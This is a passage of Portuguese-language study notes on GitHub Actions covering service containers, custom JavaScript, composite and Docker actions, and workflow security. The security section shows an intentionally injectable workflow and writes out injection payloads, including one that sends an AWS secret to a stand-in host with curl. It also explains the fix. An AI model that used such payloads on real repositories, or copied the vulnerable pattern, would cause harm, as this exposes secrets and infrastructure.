          echo "MONGODB_DB_NAME: $MONGODB_DB_NAME"
          echo "MONGODB_USERNAME: $MONGODB_USERNAME"
          echo "${{ env.PORT }}"
```


## Usando Service Containers ("Services")
Para contextos mais isolados, como, caso seja necessário realizar testes em um banco de dados que não está no contexto de produção,
pode ser usado para subir um novo banco de dados de testes.

No exemplo abaixo, é utilizado um container node com um service de mongodb, que seria um banco mongodb "local" para realizar testes
sem afetar nenhum ambiente específico ou até mesmo agilizar a velocidade de testes de integração.

```
name: Deployment - Service (Container)
on:
  push:
    branches:
      - main
      - dev
env:
  CACHE_KEY: node-deps
  MONGODB_DB_NAME: ${{ secrets.MONGODB_DB_NAME }}
jobs:
  test:
    environment: testing
    runs-on: ubuntu-latest
    # https://hub.docker.com/_/node
    container:
      image: node:16
    env:
      MONGODB_CONNECTION_PROTOCOL: mongodb
      MONGODB_CLUSTER_ADDRESS: mongodb
      MONGODB_USERNAME: root
      MONGODB_PASSWORD: example
      PORT: 8080
    # Contexto de um JOB
    # vai rodar apenas durante a execução do JOB
    services:
      # pode ser qualquer nome aqui
      mongodb:
        # todos os services sempre rodam em containers
        image: mongo
        env:
          MONGO_INITDB_ROOT_USERNAME: root
          MONGO_INITDB_ROOT_PASSWORD: example
    steps:
      - name: Get Code
        uses: actions/checkout@v3
      - name: Cache dependencies
        uses: actions/cache@v3
        with:
          path: ~/.npm
          key: ${{ env.CACHE_KEY }}-${{ hashFiles('**/package-lock.json') }}
      - name: Install dependencies
        working-directory: ./docker-examples-app
        run: npm ci
      - name: Run server
        working-directory: ./docker-examples-app
        run: npm start & npx wait-on http://127.0.0.1:$PORT # requires MongoDB Atlas to accept requests from anywhere!
      - name: Run tests
        working-directory: ./docker-examples-app
        run: npm test
      - name: Output information
        run: |
          echo "MONGODB_USERNAME: $MONGODB_USERNAME"
  deploy:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - name: Output information
        env:
          PORT: 3000
        run: |        
          echo "MONGODB_DB_NAME: $MONGODB_DB_NAME"
          echo "MONGODB_USERNAME: $MONGODB_USERNAME"
          echo "${{ env.PORT }}"
```

Jobs podem se comunicar e expor services
Para realizar a comunicação entre services containers, o github utiliza a label da service.
por exemplo: Se a label é mongodb, o endereço de comunicação vai ser mongodb (tipo localhost)


Para esse sistema de label funcionar, é necessário o ambiente rodar dentro de um container, caso contrário, seria necessário adicionar
o ip address (127.0.0.1:27017) e configurar as portas em services

Exemplo sem uso de um container node (com a necessidade de utilizar o ip address, pois é o container que faz o network utilizando labels funcionar)

```
name: Deployment - Service (Without Container)
on:
  push:
    branches:
      - main
      - dev
env:
  CACHE_KEY: node-deps
  MONGODB_DB_NAME: ${{ secrets.MONGODB_DB_NAME }}
jobs:
  test:
    environment: testing
    runs-on: ubuntu-latest
    env:
      MONGODB_CONNECTION_PROTOCOL: mongodb
      # necessário setar ip e portas
      MONGODB_CLUSTER_ADDRESS: 127.0.0.1:27017
      MONGODB_USERNAME: root
      MONGODB_PASSWORD: example
      PORT: 8080
    services:
      mongodb:
        image: mongo
        ports:
          - 27017:27017
        env:
          MONGO_INITDB_ROOT_USERNAME: root
          MONGO_INITDB_ROOT_PASSWORD: example
    steps:
      - name: Get Code
        uses: actions/checkout@v3
      - name: Cache dependencies
        uses: actions/cache@v3
        with:
          path: ~/.npm
          key: ${{ env.CACHE_KEY }}-${{ hashFiles('**/package-lock.json') }}
      - name: Install dependencies
        working-directory: ./docker-examples-app
        run: npm ci
      - name: Run server
        working-directory: ./docker-examples-app
        run: npm start & npx wait-on http://127.0.0.1:$PORT # requires MongoDB Atlas to accept requests from anywhere!
      - name: Run tests
        working-directory: ./docker-examples-app
        run: npm test
      - name: Output information
        run: |
          echo "MONGODB_USERNAME: $MONGODB_USERNAME"
  deploy:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - name: Output information
        env:
          PORT: 3000
        run: |        
          echo "MONGODB_DB_NAME: $MONGODB_DB_NAME"
          echo "MONGODB_USERNAME: $MONGODB_USERNAME"
          echo "${{ env.PORT }}"
```

# Custom Actions
Motivos para criar uma Action customizada
-> Simplificar Steps de um Workflow
-> Reusar entre os Workflows
-> Contribuir com a comunidade, publicando uma Action não existente

## Tipos de Actions
-> JavaScript  
-> Docker  
-> Composite

JavaScript -> Executa um script em JavaScript.  

Docker -> Cria um Dockerfile e roda qualquer task e em qualquer linguagem dentro do container  

Composite -> Combinação de multiplos Workflows, comandos runs e uses. Usa apenas conhecimento de GitHub Actions
apra criação de Actions  

### Estrutura de uma Action

Se caso a Action estiver em um repositório, isolada, basta apenas referenciar com nomeConta/nomeRepositorio.
No caso do exemplo que temos aqui, são Actions locais, então é só passar o path

As actions locais ficam no diretório .github > actions, e por padrão é necessário criar um diretório para cada action, por exemplo:
quero criar uma action que faz deploy de um site estático para o S3 com o nome "deploy-s3-javascript". Primeiro devo criar um
diretório e dentro dele criar os arquivos necessários. (nesse repositório temos esse exemplo).

Dentro do diretório "deploy-s3-javascript" deve ser criado um arquivo action.yml (que é padrão para qualquer tipo de action) e um arquivo que será
o nosso script js.


## Exemplo de Action JavaScript

### action.yml 
Dentro do arquivo action.yml, podemos declarar os inputs e outputs e dentro do objeto runs, declaramos a versão do node
e arquivo que possui o script js

```
name: 'Deploy to AWS S3'
description: 'Deploy a static website via AWS S3.'
inputs:
  bucket:
    description: 'The S3 bucket name.'
    required: true
  bucket-region:
    description: 'The region of the S3 bucket.'
    required: false
    default: 'us-east-1'
  dist-folder:
    description: 'The folder containing the deployable files.'
    required: true
outputs:
  website-url:
    description: 'The URL of the deployed website.'
runs:
  # https://docs.github.com/en/actions/creating-actions/creating-a-javascript-action
  using: 'node16'
  main: 'main.js'
```

### script.js

No exemplo abaixo, fazemos importes de 3 libs do GitHub Actions, onde é possível manipular os inputs, outputs, contexto do GitHub
e terminal shell do ubuntu

obs: é observado que para acessar essas libs, é necessário possuir a pasta node_modules para que a Action funcione de maneira
"standalone", sem a necessidade de instalar dependencias no momento que for reutilizada.

Dependencias necessárias:
npm install @actions/core @actions/github @actions/exec
(com o uso do npm, é necessário também executar o npm init para utilizar o arquivo package.json para gerenciar as dependências)

```
const core = require('@actions/core');
const github = require('@actions/github');
const exec = require('@actions/exec');

function run() {
    // 1- Get some input values set on action.yml
   const bucket = core.getInput('bucket', { require: true})
   const bucketRegion = core.getInput('bucket-region', { require: true})
   const distFolder = core.getInput('dist-folder', { require: true})

   // 2 - Upload files
   const s3Uri = `s3://${bucket}`
   exec.exec(`aws s3 sync ${distFolder} ${s3Uri} --region ${bucketRegion}`)

   const websiteUrl = `http://${bucket}.s3-website-${bucketRegion}.amazonaws.com`;
   core.setOutput('website-url', websiteUrl);
}

run();
```

### Usando a Action deploy-s3-javascript
No Job a seguir, é utilizada a action, inserindo variáveis de ambiente que são setadas direto no ubuntu, para serem utilizadas
pela AWS, inputs dentro do parametro with e  no step seguinte a obtenção do output setado.

```
  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - name: Get code
        uses: actions/checkout@v3
      - name: Get build artifacts
        uses: actions/download-artifact@v3
        with:
          name: dist-files
          path: ./dist
      - name: Output contents
        run: ls
      - name: Deploy site
        id: deploy
        uses: ./.github/actions/deploy-s3-javascript
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        with:
          bucket: inrikys-website
          dist-folder: ./dist
          bucket-region: us-east-1
      - name: Output information
        run: |
          echo "Live URL: ${{ steps.deploy.outputs.website-url }}"
```

## Exemplo de Action Composite

Esse tipo de Action é o mais simples, pois a estrutura é similar a de um Workflow

Por padrão, deve ser criado um diretório dentro de .github > actions com o nome da Action e com um arquivo action.yml dentro.
Um diferença aqui é que quando o comando run é utilizado nos Steps, é necessário especificar qual shell será utilizado,
no caso do exemplo abaixo, será o bash.

Nesse exemplo, é reusado o ato de cachear as dependencias, que é muito utilizado nos exemplos de Workflow dentro desse repositório. Dá para ver
como criar uma Action para reduzir o tamanho de um Workflow e deixar Steps reutilizáveis.

```
name: 'Get & Cache Dependencies'
description: 'Get the dependencies (via npm) and cache them'
inputs:
  # nome caching é a gente que decide
  caching:
    description: 'Whether to cache dependencies or not.'
    required: false
    default: 'true'
outputs:
  used-cache:
    description: 'Whether the cache was used.'
    value: ${{ steps.install.outputs.cache }}
runs:
  # Action Type
  using: 'composite'
  steps:
    - name: Cache dependencies
      if: inputs.caching == 'true'
      id: cache
      uses: actions/cache@v3
      with:
        path: ./custom-action-example-app/node_modules
        key: deps-node-modules-${{ hashFiles('**/package-lock.json') }}
    - name: Install dependencies
      id: install
      working-directory: ./custom-action-example-app
      if: steps.cache.outputs.cache-hit != 'true' || inputs.caching != 'true'
      run: |
        npm ci
        echo "cache='${{ inputs.caching }}'" >> $GITHUB_OUTPUT
      # é necessário quando o comando run é usado
      shell: bash
```

### Usando a Action Composite (cached-deps)

```
  build:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - name: Get code
        uses: actions/checkout@v3
      - name: Load & cache dependencies
        uses: ./.github/actions/cached-deps
      - name: Build website
        working-directory: ./custom-action-example-app
        run: npm run build
      - name: Upload artifacts
        uses: actions/upload-artifact@v3
        with:
          name: dist-files
          path: ./custom-action-example-app/dist
```


## Exemplo de Action Docker

Nesse tipo de Action, a gente tem a liberdade de executar o script na linguagem que a gente escolher, pois o container
que será executado terá sido configurado para a execução da linguagem escolhida.

Segue exemplo com script em python. Podemos ver que os inputs e outputs também são manipulados.

arquivo action.yml

```
name: 'Deploy to AWS S3 - Docker'
description: 'Deploy a static website via AWS S3'
inputs:
  bucket:
    description: 'The S3 bucket name.'
    required: true
  bucket-region:
    description: 'The region of the S3 bucket.'
    required: false
    default: 'us-east-1'
  dist-folder:
    description: 'The folder containing the deployable files.'
    required: true
outputs:
  website-url:
    description: 'The URL of the deployed website.'
runs:
  using: 'docker'
  image: 'Dockerfile'
```

### Dockerfile

```
FROM python:3

COPY requirements.txt /requirements.txt

RUN pip install -r requirements.txt

COPY deployment.py /deployment.py

CMD ["python", "/deployment.py"]
```

(o arquivo requirements.txt é encontrado na pasta .github > actions > deploy-s3-docker, e é usado apenas para gravar 
dependências em python, utilizando o pip, para executar o script em python)

### script.py
```
import os
import boto3
import mimetypes
from botocore.config import Config

# docker file cria um ambiente para rodar esse código

def run():
    #INPUT_NOME-DO-INPUT
    bucket = os.environ['INPUT_BUCKET']
    bucket_region = os.environ['INPUT_BUCKET-REGION']
    dist_folder = os.environ['INPUT_DIST-FOLDER']

    configuration = Config(region_name=bucket_region)

    s3_client = boto3.client('s3', config=configuration)

    for root, subdirs, files in os.walk(dist_folder):
        for file in files:
            s3_client.upload_file(
                os.path.join(root, file),
                bucket,
                os.path.join(root, file).replace(dist_folder + '/', ''),
                ExtraArgs={"ContentType": mimetypes.guess_type(file)[0]}
            )

    website_url = f'http://{bucket}.s3-website-{bucket_region}.amazonaws.com'
    # The below code sets the 'website-url' output (the old ::set-output syntax isn't supported anymore - that's the only thing that changed though)
    with open(os.environ['GITHUB_OUTPUT'], 'a') as gh_output:
        print(f'website-url={website_url}', file=gh_output)


if __name__ == '__main__':
    run()

```


# Permissions & Security

Pontos de atenção:
- Script Injection 
- Malicious Third-Party Actions
- Permissions Issues

Script Injection: Abertura ao receber input com script que possa manipular o Workflow

Malicious Third-Party Actions: Actions de terceiros que podem ler algum secret ou agir de maneira não esperada que pode ser
prejudicial ao repositório e infra-estrutura

Permission Issues: Dar apenas permissões necessárias, como por exemplo, apenas read-only para quem não precisa manipular os
Workflows.

## Segurança em Workflows

### Exemplo de Script Injection:

No exemplo a seguir, o Workflow é disparado através da abertura de uma Issue.
Nota-se que o Step utiliza o título da Issue e isso dá abertura para injeção de scripts.

```
name: Label Issues (Script Injection Example)
on:
  issues:
    types:
      - opened
jobs:
  assign-label:
    runs-on: ubuntu-latest
    steps:
      - name: Assign label
        run: |
          issue_title="${{ github.event.issue.title }}"
          if [[ "$issue_title" == *"bug"* ]]; then
          echo "Issue is about a bug!"
          else
          echo "Issue is not about a bug"
          fi
```

Caso eu criasse uma Issue com o nome a"; echo Got your secrets", eu conseguiria executar
esse comando echo, e é ai que mora o perigo, pois eu poderia fazer a leitura de alguma coisa que não é para ser lida
ou fazer manipulações

Outro exemplo de script malicioso:

a"; curl http://my-bad-site.com?$SOME_AWS_SECRET  

Um jeito de evitar que um comando shell seja injetado seria recebendo o nome da Issue em uma variável de ambiente,
pois ao receber em uma variável, o Workflow vai interpretar o input como String e não como um comando.

```
name: Label Issues (Script Injection Example)
on:
  issues:
    types:
      - opened
jobs:
  assign-label:
    runs-on: ubuntu-latest
    steps:
      - name: Assign label
        env:
          title: ${{ github.event.issue.title }}
        run: |
          if [[ "$title" == *"bug"* ]]; then
          echo "Issue is about a bug!"
          else
          echo "Issue is not about a bug"
          fi
```


poderia ser feito uma requisição passando um dado secreto para um site terceiro.


### Malicious Third-Party Actions
Para previnir uma ação inesperada de uma Action, as boas práticas seriam:
- Usar apenas Actions criadas por você
- Usar apenas Actions criadas por autores verificados (Actions verificadas pelo GitHub)
- Analisar códigos caso seja necessário utilizar Actions não verificadas


### Permissions

É possível restringir as permissões de um Workflow para evitar comportamentos inesperados. Isso é sempre uma boa prática.

Referência:
https://docs.github.com/en/actions/using-jobs/assigning-permissions-to-jobs

O Workflow abaixo é disparado quando uma issue é criada, e ele adiciona uma tag caso o título da issue tenha a palavra "bug"

```
name: Label Issues (Permissions Example)
on:
  issues:
    types:
      - opened
jobs:
  assign-label:
    # https://docs.github.com/en/actions/using-jobs/assigning-permissions-to-jobs
    permissions:
      issues: write # é uma boa prática deixar o mínimo de permissão possível para evitar comportamentos inesperados
    runs-on: ubuntu-latest
    steps:
      - name: Assign label
        if: contains(github.event.issue.title, 'bug')
        run: |
          curl -X POST \
          --url https://api.github.com/repos/${{ github.repository }}/issues/${{ github.event.issue.number }}/labels \
          -H 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \
          -H 'content-type: application/json' \
          -d '{
              "labels": ["bug"]
            }' \
          --fail
```

O GITHUB_TOKEN gerado conforme as permissões e escopos setados em permissions.
É importante entender que ao setar permissões pode alterar GITHUB_TOKEN que será usado em outras Action dentro do Job. 
Pode ser que ao alterar alguma Action possa parar de funcionar dentro da Job.

Em Settings > Actions > General, é possível configurar permissões de Workflows para tornar o script mais restrito.


### Permissões de terceiros & OpenID Connect

Caso seja necessário gerenciar permissões de terceiros, como por exemplo da AWS, é possível utilizar uma url (identity provider) e adicionar como provider na AWS
e adicionar polices através da AWS.
Invés de utilizar variáveis de ambiente usando keys da AWS, é possível apenas utilizar os permissions de acordo com a documentação abaixo.

https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect
https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services

Referências sobre security:
In addition to the concepts covered in this module, you should absolutely also explore the security guides by GitHub itself:
General overview & important concepts: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
More on Secrets: https://docs.github.com/en/actions/security-guides/encrypted-secrets
Using GITHUB_TOKEN: https://docs.github.com/en/actions/security-guides/automatic-token-authentication
Advanced - Preventing Fork Pull Requests Attacks: https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
Security Hardening with OpenID Connect: https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect